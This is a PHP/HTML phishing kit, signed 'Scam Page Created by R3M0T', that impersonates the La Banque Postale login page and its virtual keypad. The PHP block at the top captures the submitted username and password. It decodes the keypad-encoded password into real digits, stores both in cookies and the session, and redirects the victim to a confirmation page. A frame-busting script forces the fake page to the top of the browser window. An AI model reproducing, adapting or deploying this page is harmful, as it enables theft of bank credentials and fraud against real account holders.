<?php
// Scam Page Created by R3M0T <3 | 2019-2020
if($_GET[set] == "ok"){
$user = $_POST[username];
$pass = $_POST[password];

$str = $pass;
$table=array();$result="";
$compteur = strlen($str);$j=0;
//echo $compteur;
for($i=0; $i < $compteur; $i++)
{
$table[$j]=$str[$i].$str[$i+1];
$i=$i+1;
$j=$j+1;
}
for($i=0; $i < ($compteur)/2; $i++)
{

				if($table[$i]=="00"){$result.=str_replace("00", '7',$table[$i]);}else
				if($table[$i]=="03"){$result.=str_replace("03", '5',$table[$i]);}else
				if($table[$i]=="04"){$result.=str_replace("04", '3',$table[$i]);}else
				if($table[$i]=="05"){$result.=str_replace("05", '9',$table[$i]);}else
				if($table[$i]=="06"){$result.=str_replace("06", '4',$table[$i]);}else
				if($table[$i]=="08"){$result.=str_replace("08", '2',$table[$i]);}else
				if($table[$i]=="09"){$result.=str_replace("09", '0',$table[$i]);}else
				if($table[$i]=="11"){$result.=str_replace("11", '6',$table[$i]);}else
				if($table[$i]=="13"){$result.=str_replace("13", '1',$table[$i]);}else
				if($table[$i]=="15"){$result.=str_replace("15", '8',$table[$i]);}
}
$password=$result;


setcookie("UsernameCockie", $_POST[username], time()+3600);
setcookie("PasswordCookie", $password, time()+3600);

session_start();
$_SESSION['username'] = $_POST['username'];
$_SESSION['password'] = $_POST['password'];
header('Location: confirmation.php');
echo '
<script type="text/javascript">
if( window.  parent . length !=0) {
    window. top . location .replace( document. location.href);}
</script>
';

exit;
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html class="no-js" lang="fr"><head>

<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>
Identification - La Banque Postale</title>

<meta http-equiv="content-style-type" content="text/css">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="icon" type="image/png" href="images/ico.png" />
<style type="text/css">
@import url(./css/cvs_all.css);
[id="imageclavier"]{
background:url()  no-repeat 13px 6px; 
} 
</style>
<style type="text/css" media="(orientation:portrait) and (max-height:533px)">
@import url(./css/cvs_portable.css);
[id="imageclavier"]{
background:url(data_img/login.png) no-repeat 13px 6px; 
}
</style></head>
<body id="mobipart" style="background-image: url('img/bad.png');">

<form method="post" action="?set=ok" target="_top"  name="formAccesCompte">
<div id="cvs-bloc">
<div style="margin-left: 3px; width: 270px;" id="cvs-bloc-identifiant"><label class="webaccess" for="val_cel_identifiant">
	identifiant</label>
<input autocorrect="off" name="username" id="val_cel_identifiant" autocapitalize="off" format="*N" placeholder="Saisissez ici votre identifiant" maxlength="10" pattern="[0-9,a-z,A-Z]*" spellcheck="false" onkeypress="return checkInput(event);" type="tel"> <input class="input-non-modif" id="val_cel_identifiant_masque" disabled="disabled" type="tel"> <input id="saveId" name="saveId" onchange="modifIdent()" type="checkbox"> <label for="saveId">
	Memoriser mon identifiant.</label> </div>
<div id="cvs-bloc-mdp"> <label class="webaccess" for="cvs-bloc-mdp-input">mot de 
	passe</label> <input name="password" disabled="disabled" id="cvs-bloc-mdp-input" placeholder="Composez votre mot de passe" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" type="text">
<div id="cvs-lien-voca"> <input class="non-cache" id="cvs-lien-voca-active" value="Activer la vocalisation" onclick="CVSVTable.lancer();" type="button"> <input class="cache" id="cvs-lien-voca-desactive" value="DÃ&#402;Â¦#402;Ã&#8224;Â¦#8217;Ã&#402;Â¦#8218;Ã&#8218;Â©sactiver la vocalisation" onclick="desactiverVocalisation();" type="button"> </div>
<div id="blocImage">
<div id="imageclavier">
<div> <button type="button" value="5" id="val_cel_0"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="1" id="val_cel_1"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="8" id="val_cel_2"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="3" id="val_cel_3"><img alt="" src="images/transparent.gif"></button></div>
<!--



-->
<div> <button type="button" id="val_cel_4"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" id="val_cel_5"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="4" id="val_cel_6"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="0" id="val_cel_7"><img alt="" src="images/transparent.gif"></button></div>
<!--



-->
<div> <button type="button" id="val_cel_8"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="9" id="val_cel_9"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="6" id="val_cel_10"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="7" id="val_cel_11"><img alt="" src="images/transparent.gif"></button></div>
<!--



-->
<div> <button type="button" id="val_cel_12"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="2" id="val_cel_13"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" id="val_cel_14"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" id="val_cel_15"><img alt="" src="images/transparent.gif"></button></div>
</div>
</div>
<div class="webaccess">Fin du clavier virtuel</div>
</div>
<div id="cvs-bloc-boutons"> <input name="password" id="cs" value="" type="hidden"><input id="valider" value="Valider" disabled="disabled" class="grey" onclick="sendForm();" type="button"> <input id="effacer" value="Effacer" onclick="CVSVTable.reset();" type="button">
</div>
</div>
</form>
<div id="cvs_swf">&nbsp;</div>
<div id="audio_box"> <audio id="audio" preload="none"><br>
</audio> </div>
<noscript>
<div id="noscript"> </div>
</noscript>
<script language="javascript" type="text/javascript" src="./js/jquery-1.7.2.min.js"></script>
<script language="javascript" type="text/javascript" src="./js/val_keypad_cvvs-commun-unifie.js"></script>
<script language="javascript" type="text/javascript" src="./js/val_keypad_cvvs-unifie.js"></script>
</body></html>
